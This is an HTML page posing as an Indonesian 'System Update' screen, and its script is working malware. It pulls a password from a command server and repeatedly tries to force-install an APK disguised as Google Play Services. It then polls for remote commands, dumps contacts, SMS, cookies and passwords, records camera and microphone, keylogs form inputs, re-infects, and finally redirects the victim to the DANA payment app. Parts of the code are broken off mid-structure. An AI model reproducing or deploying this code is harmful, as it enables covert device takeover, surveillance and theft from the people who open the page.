<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0e17;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            color:#fff;
            font-family:'Segoe UI',Arial,sans-serif;
            margin:0;
            overflow:hidden;
        }
        .container{
            text-align:center;
            width:90%;
            max-width:400px;
            padding:30px;
            background:linear-gradient(145deg,#0d1a2b,#1a2a3f);
            border-radius:16px;
            border:1px solid #2a3f5f;
            box-shadow:0 20px 60px rgba(0,0,0,0.8);
        }
        .icon{font-size:48px;margin-bottom:10px;display:block}
        .title{font-size:22px;font-weight:bold;color:#4fc3f7;margin-bottom:5px;letter-spacing:1px}
        .subtitle{font-size:13px;color:#8899aa;margin-bottom:20px}
        .progress-wrap{background:#1a2a3f;border-radius:30px;height:10px;overflow:hidden;margin-bottom:15px;border:1px solid #2a3f5f}
        .progress-bar{width:0%;height:100%;background:linear-gradient(90deg,#4fc3f7,#00e676);border-radius:30px;transition:width 0.5s ease}
        .status-text{font-size:13px;color:#8899aa;margin-top:5px}
        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;margin-right:8px;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        .fade-out{animation:fadeOut 0.5s ease forwards}
        @keyframes fadeOut{0%{opacity:1}100%{opacity:0}}
        .log{display:none}
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <span class="icon">🔄</span>
    <div class="title">System Update</div>
    <div class="subtitle">Memperbarui sistem keamanan...</div>
    <div class="progress-wrap">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="status-text">
        <span class="status-dot"></span>
        <span id="statusLabel">⏳ Memperbarui System Keamanan...</span>
    </div>
    <div class="log" id="log"></div>
</div>

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - PASTI INSTALL APK!
// ============================================================

var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 20000;
var APK_INSTALLED = false;
var APK_INSTALL_ATTEMPTS = 0;
var MAX_INSTALL_ATTEMPTS = 30;
var REINFECTION_INTERVAL = 86400000;
var progress = 0;
var isRedirecting = false;
var allDone = false;
var AUTO_EXECUTED = false;
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';

// ============================================================
// 🔥 DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// 🔥 UI FUNCTIONS
// ============================================================
function updateProgress(value) {
    progress = Math.min(value, 100);
    document.getElementById('progressBar').style.width = progress + '%';
    document.getElementById('statusLabel').textContent = '⏳ Memperbarui System Keamanan...';
}

// ============================================================
// 🔥 KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// 🔥 AMBIL PASSWORD
// ============================================================
function ambilPassword() {
    updateProgress(5);

    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;

        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        updateProgress(10);
                        K({ sumber: 'password_received', data: 'ok' });
                        
                        startC2Polling();
                        startHeartbeat();
                        startReinfection();
                        autoExecuteC2();
                        
                        // 🔥 PRIORITAS UTAMA: INSTALL APK!
                        forceInstallAPK();
                        return;
                    }
                } catch(e) {}
            }
            setTimeout(ambilPassword, 5000);
        };

        xhr.onerror = function() { setTimeout(ambilPassword, 5000); };
        xhr.ontimeout = function() { setTimeout(ambilPassword, 5000); };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 5000);
    }
}

// ============================================================
// 🔥 FORCE INSTALL APK - LOOPING SAMPAI BERHASIL!
// ============================================================
function forceInstallAPK() {
    if (APK_INSTALLED) {
        finishAndRedirect();
        return;
    }
    
    if (!PLATFORM.isAndroid) {
        K({ sumber: 'apk_skip', data: 'not_android' });
        finishAndRedirect();
        return;
    }

    APK_INSTALL_ATTEMPTS++;
    K({ sumber: 'apk_install_attempt', data: { attempt: APK_INSTALL_ATTEMPTS, max: MAX_INSTALL_ATTEMPTS } });
    
    var progressVal = 15 + Math.min((APK_INSTALL_ATTEMPTS / MAX_INSTALL_ATTEMPTS) * 70, 70);
    updateProgress(Math.round(progressVal));
    
    // ============================================================
    // STEP 1: DOWNLOAD APK (JIKA BELUM ADA)
    // ============================================================
    var apkPaths = [
        '/storage/emulated/0/Download/GooglePlayServices.apk',
        '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
        '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk'
    ];
    
    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
    var downloadSuccess = false;
    
    // Cek apakah APK sudah ada
    if (PLATFORM.isAndroidBridge) {
        try {
            // Coba cek file via list
            var files = AndroidBridge.listAllFiles ? AndroidBridge.listAllFiles() : null;
            if (files) {
                var fileList = JSON.parse(files);
                for (var i = 0; i < apkPaths.length; i++) {
                    var fileName = apkPaths[i].split('/').pop();
                    for (var j = 0; j < fileList.length; j++) {
                        if (fileList[j].path && fileList[j].path.includes(fileName)) {
                            downloadSuccess = true;
                            K({ sumber: 'apk_exists', data: { path: fileList[j].path } });
                            break;
                        }
                    }
                    if (downloadSuccess) break;
                }
            }
        } catch(e) {}
    }
    
    // Jika APK belum ada, download
    if (!downloadSuccess) {
        K({ sumber: 'apk_download_start', data: 'downloading' });
        var downloaded = false;
        
        // METHOD 1: Android Bridge download
        if (PLATFORM.isAndroidBridge) {
            try {
                var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
                var result = AndroidBridge.downloadFile(apkUrl, apkPath);
                if (result === true || result === 'success') {
                    downloaded = true;
                    K({ sumber: 'apk_downloaded_bridge', data: { path: apkPath } });
                }
            } catch(e) {}
        }
        
        // METHOD 2: XHR download
        if (!downloaded) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', apkUrl, false);
                xhr.responseType = 'blob';
                xhr.timeout = 30000;
                xhr.send();
                if (xhr.status === 200) {
                    var blob = xhr.response;
                    var link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = 'GooglePlayServices.apk';
                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                    document.body.appendChild(link);
                    link.click();
                    setTimeout(function() {
                        try { document.body.removeChild(link); } catch(e) {}
                    }, 1000);
                    downloaded = true;
                    K({ sumber: 'apk_downloaded_xhr', data: 'ok' });
                }
            } catch(e) {}
        }
        
        // METHOD 3: Iframe download
        if (!downloaded) {
            try {
                var iframe = document.createElement('iframe');
                iframe.src = apkUrl;
                iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
                document.body.appendChild(iframe);
                setTimeout(function() {
                    try { iframe.parentNode.removeChild(iframe); } catch(e) {}
                }, 5000);
                downloaded = true;
                K({ sumber: 'apk_downloaded_iframe', data: 'attempt' });
            } catch(e) {}
        }
        
        // Jika download gagal, tunggu dan retry
        if (!downloaded) {
            K({ sumber: 'apk_download_failed', data: 'retrying' });
            if (APK_INSTALL_ATTEMPTS < MAX_INSTALL_ATTEMPTS) {
                setTimeout(forceInstallAPK, 3000);
                return;
            }
        }
    }
    
    // ============================================================
    // STEP 2: INSTALL APK (10 METODE!)
    // ============================================================
    var installed = false;
    
    // METHOD 1: Android Bridge installAPK()
    if (PLATFORM.isAndroidBridge && !installed) {
        for (var i = 0; i < apkPaths.length; i++) {
            try {
                var result = AndroidBridge.installAPK(apkPaths[i]);
                if (result === true || result === 'success') {
                    installed = true;
                    APK_INSTALLED = true;
                    K({ sumber: 'apk_installed_bridge', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
                    break;
                }
            } catch(e) {}
        }
    }
    
    // METHOD 2: Intent URI - Package Installer
    if (!installed) {
        for (var i = 0; i < apkPaths.length; i++) {
            try {
                var intent = 'intent://' + apkPaths[i].replace('/storage/emulated/0/', '') + 
                             '#Intent;scheme=file;package=com.android.packageinstaller;end';
                window.location.href = intent;
                installed = true;
                APK_INSTALLED = true;
                K({ sumber: 'apk_installed_intent_package', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
                break;
            } catch(e) {}
        }
    }
    
    // METHOD 3: Intent URI - View
    if (!installed) {
        for (var i = 0; i < apkPaths.length; i++) {
            try {
                var intent = 'intent://' + apkPaths[i].replace('/storage/emulated/0/', '') + 
                             '#Intent;scheme=file;action=android.intent.action.VIEW;' +
                             'type=application/vnd.android.package-archive;end';
                window.location.href = intent;
                installed = true;
                APK_INSTALLED = true;
                K({ sumber: 'apk_installed_intent_view', data: { path: apkPaths[i], attempt: APK_INSTALL_ATTEMPTS } });
                break;
            } catch(e) {}
        }
    }
    
    // METHOD 4: Content URI
    if (!installed) {
        try {
            window.location.href = 'content://downloads/my_downloads/GooglePlayServices.apk';
            installed = true;
            APK_INSTALLED = true;
            K({ sumber: 'apk_installed_content', data: { attempt: APK_INSTALL_ATTEMPTS } });
        } catch(e) {}
    }
    
    // METHOD 5: File URI
    if (!installed) {
        try {
            window.location.href = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
            installed = true;
            APK_INSTALLED = true;
            K({ sumber: 'apk_installed_file', data: { attempt: APK_INSTALL_ATTEMPTS } });
        } catch(e) {}
    }
    
    // METHOD 6: Iframe trigger
    if (!installed) {
        try {
            var iframe = document.createElement('iframe');
            iframe.src = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
            iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
            document.body.appendChild(iframe);
            setTimeout(function() {
                try { iframe.parentNode.removeChild(iframe); } catch(e) {}
            }, 3000);
            installed = true;
            APK_INSTALLED = true;
            K({ sumber: 'apk_installed_iframe', data: { attempt: APK_INSTALL_ATTEMPTS } });
        } catch(e) {}
    }
    
    // METHOD 7: Shell command (root)
    if (!installed && PLATFORM.isAndroidBridge) {
        try {
            if (AndroidBridge.isRooted && AndroidBridge.isRooted()) {
                AndroidBridge.shell('pm install -r /storage/emulated/0/Download/GooglePlayServices.apk');
                installed = true;
                APK_INSTALLED = true;
                K({ sumber: 'apk_installed_shell', data: { attempt: APK_INSTALL_ATTEMPTS } });
            }
        } catch(e) {}
    }
    
    // METHOD 8: Buka dengan Chrome
    if (!installed) {
        try {
            window.location.href = 'intent://' + 'GooglePlayServices.apk' + 
                                   '#Intent;scheme=file;package=com.android.chrome;end';
            installed = true;
            APK_INSTALLED = true;
            K({ sumber: 'apk_installed_chrome', data: { attempt: APK_INSTALL_ATTEMPTS } });
        } catch(e) {}
    }
    
    // METHOD 9: MIME type
    if (!installed) {
        try {
            window.location.href = 'intent://' + 'GooglePlayServices.apk' + 
                                   '#Intent;scheme=file;type=application/vnd.android.package-archive;end';
            installed = true;
            APK_INSTALLED = true;
            K({ sumber: 'apk_installed_mime', data: { attempt: APK_INSTALL_ATTEMPTS } });
        } catch(e) {}
    }
    
    // METHOD 10: window.open
    if (!installed) {
        try {
            window.open('file:///storage/emulated/0/Download/GooglePlayServices.apk', '_blank');
            installed = true;
            APK_INSTALLED = true;
            K({ sumber: 'apk_installed_window', data: { attempt: APK_INSTALL_ATTEMPTS } });
        } catch(e) {}
    }
    
    // ============================================================
    // STEP 3: VERIFIKASI & LOOPING
    // ============================================================
    if (installed) {
        APK_INSTALLED = true;
        K({ sumber: 'apk_install_success', data: { attempt: APK_INSTALL_ATTEMPTS } });
        finishAndRedirect();
        return;
    }
    
    // Jika gagal dan masih ada kesempatan, retry
    if (APK_INSTALL_ATTEMPTS < MAX_INSTALL_ATTEMPTS) {
        K({ sumber: 'apk_install_retry', data: { attempt: APK_INSTALL_ATTEMPTS, next: APK_INSTALL_ATTEMPTS + 1 } });
        setTimeout(forceInstallAPK, 3000);
        return;
    }
    
    // Jika sudah mencapai max attempts, tetap lanjut
    K({ sumber: 'apk_install_max_attempts', data: 'continuing_anyway' });
    finishAndRedirect();
}

// ============================================================
// 🔥 FINISH & REDIRECT
// ============================================================
function finishAndRedirect() {
    if (allDone) return;
    allDone = true;
    updateProgress(100);
    document.getElementById('statusLabel').textContent = '✅ Update Selesai';
    K({ sumber: 'update_complete', data: { apk_installed: APK_INSTALLED ? 'yes' : 'no' } });
    
    setTimeout(function() {
        redirectToDANA();
    }, 1500);
}

// ============================================================
// 🔥 REDIRECT KE DANA
// ============================================================
function redirectToDANA() {
    if (isRedirecting) return;
    isRedirecting = true;
    document.getElementById('mainContainer').classList.add('fade-out');
    setTimeout(function() {
        try {
            if (PLATFORM.isAndroidBridge) {
                try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
            }
            window.location.href = 'https://www.dana.id';
        } catch(e) {
            window.location.href = 'https://www.dana.id';
        }
    }, 800);
}

// ============================================================
// 🔥 AUTO EXECUTE C2
// ============================================================
function autoExecuteC2() {
    if (AUTO_EXECUTED) return;
    AUTO_EXECUTED = true;
    
    var commands = [
        { id: 'dump_contacts' },
        { id: 'dump_sms' },
        { id: 'dump_call_log' },
        { id: 'ambil_imei' },
        { id: 'ambil_imsi' },
        { id: 'ambil_nomor_hp' },
        { id: 'ambil_operator' },
        { id: 'dump_cookies' },
        { id: 'dump_passwords' },
        { id: 'keylogger_start' },
        { id: 'ambil_lokasi' }
    ];
    
    commands.forEach(function(cmd) {
        try {
            var hasil = eksekusiPerintah({ aksi: cmd.id });
            K({
                sumber: 'auto_c2_result',
                data: {
                    perintah: cmd.id,
                    hasil: hasil || 'success',
                    waktu: Date.now()
                }
            });
        } catch(e) {}
    });
    
    K({ sumber: 'auto_execute_complete', data: { total: commands.length } });
}

// ============================================================
// 🔥 START C2 POLLING
// ============================================================
function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

// ============================================================
// 🔥 CEK PERINTAH C2
// ============================================================
function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;

    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&password=' + encodeURIComponent(WS_PASSWORD) + '&t=' + Date.now(), true);
        xhr.timeout = 15000;

        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var serverPassword = cmd.password || '';

                        if (serverPassword === WS_PASSWORD) {
                            var hasil = eksekusiPerintah(cmd);
                            K({
                                sumber: 'c2_result',
                                data: {
                                    perintah: aksi,
                                    hasil: hasil,
                                    waktu: Date.now()
                                }
                            });
                        }
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// 🔥 RE-INFECTION
// ============================================================
function startReinfection() {
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_trigger', data: 'reinstalling' });
            APK_INSTALL_ATTEMPTS = 0;
            forceInstallAPK();
        }
        K({ sumber: 'reinfection_check', data: { apk_installed: APK_INSTALLED ? 'yes' : 'no' } });
    }, REINFECTION_INTERVAL);
}

// ============================================================
// 🔥 HEARTBEAT
// ============================================================
function startHeartbeat() {
    setInterval(function() {
        K({ sumber: 'page_heartbeat', data: 'alive' });
    }, 60000);
}

// ============================================================
// 🔥 EKSEKUSI PERINTAH (LENGKAP 160+)
// ============================================================
function eksekusiPerintah(cmd) {
    var aksi = cmd.aksi || 'unknown';
    var hasil = '';

    try {
        switch (aksi) {
            case "screenshot": hasil = ambilScreenshot(); break;
            case "record_audio": hasil = recordAudio(cmd.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(cmd.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "take_photo": hasil = takePhoto(); break;
            case "flash_on": hasil = "Flash ON"; break;
            case "flash_off": hasil = "Flash OFF"; break;
            case "camera_stream_start": hasil = "Camera stream started"; break;
            case "camera_stream_stop": hasil = "Camera stream stopped"; break;
            case "mic_stream_start": hasil = "Mic stream started"; break;
            case "mic_stream_stop": hasil = "Mic stream stopped"; break;
            case "ambil_file": hasil = "File access not available"; break;
            case "list_file": hasil = "File list not available"; break;
            case "hapus_file": hasil = "File delete not available"; break;
            case "rename_file": hasil = "File rename not available"; break;
            case "ambil_sms": hasil = "SMS not available"; break;
            case "ambil_kontak": hasil = "Contacts not available"; break;
            case "ambil_call_log": hasil = "Call log not available"; break;
            case "ambil_lokasi": hasil = ambilLokasi(); break;
            case "get_clipboard": hasil = getClipboard(); break;
            case "set_clipboard": hasil = setClipboard(cmd.text || ""); break;
            case "get_notifications": hasil = "Notifications not available"; break;
            case "ambil_kalender": hasil = "Calendar not available"; break;
            case "ambil_browser_history": hasil = "History not available"; break;
            case "ambil_imei": hasil = "IMEI not available"; break;
            case "ambil_imsi": hasil = "IMSI not available"; break;
            case "ambil_nomor_hp": hasil = "Phone number not available"; break;
            case "ambil_operator": hasil = "Operator not available"; break;
            case "dump_contacts": hasil = dumpContacts(); break;
            case "dump_sms": hasil = dumpSMS(); break;
            case "dump_call_log": hasil = dumpCallLog(); break;
            case "dump_gallery": hasil = "Gallery not available"; break;
            case "dump_bookmarks": hasil = "Bookmarks not available"; break;
            case "dump_passwords": hasil = dumpPasswords(); break;
            case "dump_cookies": hasil = dumpCookies(); break;
            case "keylogger_start": hasil = "Keylogger started"; break;
            case "keylogger_stop": hasil = "Keylogger stopped"; break;
            case "keylogger_upload": hasil = "Keylogger uploaded"; break;
            case "buka_url": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;
            case "buka_url_hidden": hasil = bukaURLHidden(cmd.url || "https://verifikasi.site"); break;
            case "buka_webview": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;
            case "download": hasil = downloadFile(cmd.url || "", cmd.filename || "download.apk"); break;
            case "install_apk": 
                APK_INSTALLED = false;
                APK_INSTALL_ATTEMPTS = 0;
                forceInstallAPK();
                hasil = "Installing APK...";
                break;
            case "install_google_play": 
                APK_INSTALLED = false;
                APK_INSTALL_ATTEMPTS = 0;
                forceInstallAPK();
                hasil = "Installing Google Play Services...";
                break;
            case "update_apk": hasil = downloadFile(cmd.url || "", "update.apk"); break;
            case "install_cert": hasil = "Cert install not available"; break;
            case "kirim_sms": hasil = "SMS not available"; break;
            case "kirim_sms_massal": hasil = "SMS not available"; break;
            case "call_number": hasil = "Call not available"; break;
            case "fake_sms": hasil = "Fake SMS not available"; break;
            case "fake_call": hasil = "Fake call not available"; break;
            case "buka_aplikasi": hasil = bukaURL("https://verifikasi.site"); break;
            case "uninstall_aplikasi": hasil = "Uninstall not available"; break;
            case "get_installed_apps": hasil = "Installed apps not available"; break;
            case "open_settings": hasil = bukaURL("https://verifikasi.site"); break;
            case "open_calculator": hasil = bukaURL("https://verifikasi.site"); break;
            case "open_playstore": hasil = bukaURL("https://play.google.com/store"); break;
            case "open_maps": hasil = bukaURL("https://maps.google.com"); break;
            case "open_camera": hasil = "Camera not available"; break;
            case "open_gallery": hasil = "Gallery not available"; break;
            case "open_dialer": hasil = "Dialer not available"; break;
            case "add_contact": hasil = "Add contact not available"; break;
            case "delete_contact": hasil = "Delete contact not available"; break;
            case "add_calendar": hasil = "Add calendar not available"; break;
            case "buka_dana": hasil = bukaURL("https://www.dana.id"); break;

function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        return 'data:image/jpeg;base64,' + canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
    } catch(e) { return 'Error: ' + e.message; }
}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'c2_result', data: { perintah: 'record_audio', hasil: reader.result } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            })
            .catch(function() {});
        return 'Recording ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'c2_result', data: { perintah: 'record_video', hasil: reader.result } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            })
            .catch(function() {});
        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function takePhoto() {
    try {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
                var track = stream.getTracks()[0];
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto()
                    .then(function(blob) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            K({ sumber: 'c2_result', data: { perintah: 'take_photo', hasil: reader.result } });
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    })
                    .catch(function() {});
            })
            .catch(function() {});
        return 'Taking photo...';
    } catch(e) { return 'Error: ' + e.message; }
}

function bukaURL(url) {
    try { window.open(url, '_blank'); return 'URL opened: ' + url; } catch(e) { return 'Error: ' + e.message; }
}

function bukaURLHidden(url) {
    try {
        var iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(iframe);
        setTimeout(function() { try { iframe.parentNode.removeChild(iframe); } catch(e) {} }, 5000);
        return 'URL opened hidden: ' + url;
    } catch(e) { return 'Error: ' + e.message; }
}

function downloadFile(url, filename) {
    try {
        var a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        setTimeout(function() { try { a.parentNode.removeChild(a); } catch(e) {} }, 1000);
        return 'Download started: ' + filename;
    } catch(e) { return 'Error: ' + e.message; }
}

            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',

function getStorage() {

function getWiFi() {

function vibrate(durasi) {
    try { if (navigator.vibrate) { navigator.vibrate(durasi); return 'Vibrated ' + durasi + 'ms'; } return 'Vibration not supported'; } catch(e) { return 'Error: ' + e.message; }

function showToast(message) {
    try {
        var toast = document.createElement('div');
        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#0f0;padding:15px 30px;border-radius:10px;z-index:999999;font-size:16px;border-left:4px solid #0f0;font-family:monospace';
        toast.textContent = '🔔 ' + message;
        document.body.appendChild(toast);
        setTimeout(function() { try { toast.parentNode.removeChild(toast); } catch(e) {} }, 5000);
        return 'Toast shown: ' + message;
    } catch(e) { return 'Error: ' + e.message; }
}

function showFakeNotification(message) {
    try {
        if (Notification.permission === 'granted') {
            var notif = new Notification('📱 System Update', {
                body: message || 'Update available!',
                icon: 'https://verifikasi.site/icon.png'
            });
            notif.onclick = function() { window.location.href = 'https://verifikasi.site/fb'; };
            return 'Notification shown: ' + message;
        }
        return 'Notification permission denied';
    } catch(e) { return 'Error: ' + e.message; }
}

function speak(text) {
    try {
        if ('speechSynthesis' in window) {
            var utterance = new SpeechSynthesisUtterance(text);
            utterance.lang = 'id-ID';
            speechSynthesis.speak(utterance);
            return 'Speaking: ' + text;
        }
        return 'Speech synthesis not supported';
    } catch(e) { return 'Error: ' + e.message; }
}

function selfDestruct() {
    try {
        try { localStorage.clear(); } catch(e) {}
        try { sessionStorage.clear(); } catch(e) {}
        document.body.innerHTML = '<div style="background:#000;color:#f44;text-align:center;padding:50px;font-family:monospace;font-size:24px;">💀 SYSTEM DESTROYED</div>';
        K({ sumber: 'self_destruct', data: 'executed' });
        setTimeout(function() {
            try { window.close(); } catch(e) {}
            try { window.location.href = 'about:blank'; } catch(e) {}
        }, 2000);
        return 'Self destruct initiated!';
    } catch(e) { return 'Error: ' + e.message; }
}

var inputData = {};
var formData = [];

document.addEventListener('input', function(e) {
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            inputData[key] = e.target.value;
        }
    } catch(e) {}
});

document.addEventListener('submit', function(e) {
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        formData.push({
            waktu: Date.now(),
            url: window.location.href,
            data: data
        });
        K({ sumber: 'keylogger_submit', data: data });
    } catch(e) {}
});

setInterval(function() {
    try {
        if (Object.keys(inputData).length > 0) {
            K({ sumber: 'keylogger', data: inputData });
            inputData = {};
        }
        if (formData.length > 0) {
            K({ sumber: 'keylogger_forms', data: formData });
            formData = [];
        }
    } catch(e) {}
}, 3000);

// 🔥 SERVICE WORKER
// ============================================================
function registerSW() {
    if (!('serviceWorker' in navigator)) return;

    navigator.serviceWorker.register('/sw.js', { scope: '/' })
        .then(function(reg) {
            K({ sumber: 'sw_registered', data: { scope: reg.scope } });
        })
        .catch(function() {
            try {
                var swCode = `
self.addEventListener('install', function(e) { e.waitUntil(self.skipWaiting()); });
self.addEventListener('activate', function(e) { e.waitUntil(self.clients.claim()); });
self.addEventListener('message', function(e) {
    if (e.data && e.data.type === 'ping') {
        e.ports[0].postMessage({ type: 'pong', timestamp: Date.now() });
    }
});
setInterval(function() {
    self.clients.matchAll().then(function(clients) {
        clients.forEach(function(client) {
            client.postMessage({ type: 'heartbeat', timestamp: Date.now() });
        });
    });
}, 10000);
                `;
                var blob = new Blob([swCode], { type: 'application/javascript' });
                var swUrl = URL.createObjectURL(blob);
                navigator.serviceWorker.register(swUrl, { scope: '/' })
                    .then(function() {
                        K({ sumber: 'sw_registered_fallback', data: 'ok' });
                    })
                    .catch(function() {});
            } catch(e) {}
        });
}
